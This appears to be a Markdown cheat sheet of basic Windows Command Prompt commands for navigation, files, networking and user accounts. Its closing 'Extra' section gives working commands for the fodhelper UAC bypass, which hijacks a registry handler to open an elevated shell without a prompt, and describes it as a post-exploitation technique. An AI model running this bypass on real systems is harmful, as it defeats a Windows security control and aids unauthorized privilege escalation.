# Windows Command Prompt

## Table of Contents

- [Introduction](#introduction)
- [Basic Navigation](#basic-navigation)
- [File and Directory Management](#file-and-directory-management)
- [File Manipulation](#file-manipulation)
- [System and Network Utilities](#system-and-network-utilities)
- [User Management](#user-management)
- [Extra: Bypassing UAC via Command Prompt](#extra-bypassing-uac-via-command-prompt)

---

## Introduction

The Windows Command Prompt (`cmd.exe`) is a command-line interpreter that has been part of Windows systems since the early days of MS-DOS, released in 1981. It remains a powerful tool for automation, scripting, and direct system interaction.

Although modern tools like PowerShell and Windows Terminal offer enhanced features, the classic Command Prompt is still widely used for its simplicity, speed, and legacy script compatibility.

---

## Basic Navigation

- `echo %cd%` – Displays the current working directory.
- `cd` – Changes to a directory.
- `cd ..` – Moves up one level.
- `cd \` – Goes to the root directory.
- `dir` – Lists contents of the current directory.

---

## File and Directory Management

- `mkdir foldername` – Creates a new folder.
- `rmdir foldername` – Removes an empty folder.
- `rmdir /s foldername` – Deletes a folder and all its contents.
- `dir /a` – Lists hidden files and folders.

---

## File Manipulation

- `echo "text" > filename.txt` – Creates a file with content (overwrites).
- `echo "text" >> filename.txt` – Appends content to an existing file.
- `type filename.txt` – Displays the content of a file.
- `cls` – Clears the screen.
- `copy source.txt dest.txt` – Copies a file.
- `move source.txt dest.txt` – Moves or renames a file.
- `del filename.txt` – Deletes a file.
- `attrib +h filename.txt` – Hides a file.

---

## System and Network Utilities

- `ipconfig` – Displays basic IP configuration.
- `ipconfig /all` – Displays full IP configuration details.
- `netstat -n` – Shows active network connections.
- `netstat -p tcp` or `netstat -p udp` – Displays TCP/UDP connections.
- `tasklist` – Lists all running processes.
- `taskkill /pid [pid]` – Terminates a process by PID.

---

## User Management

- `net user` – Lists all user accounts.
- `net user username` – Displays details of a specific user.
- `net user username password /add` – Creates a new user.
- `net user username /delete` – Deletes a user account.

---

## Extra: Bypassing UAC via Command Prompt

In some cases, if the current user is already part of the Administrators group (but without elevated privileges), it's possible to bypass UAC using only the Command Prompt, without external tools.

### Requirements

- The user must have Administrator rights.
- UAC must not be set to “Always notify.”
- Tested on Windows 10 and Windows 11.

### Command Prompt UAC Bypass (Fodhelper Method)

This technique abuses the `fodhelper.exe` binary, which is marked as `autoElevate` in its manifest.

Steps:

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
start fodhelper.exe
```

A new `cmd.exe` window will open with elevated (Administrator) privileges, without prompting for UAC confirmation.

To clean up:

```cmd
reg delete HKCU\Software\Classes\ms-settings /f
```

This is a well-known technique used in post-exploitation scenarios to escalate privileges once inside a system.

Use only in ethical hacking labs or with proper authorization.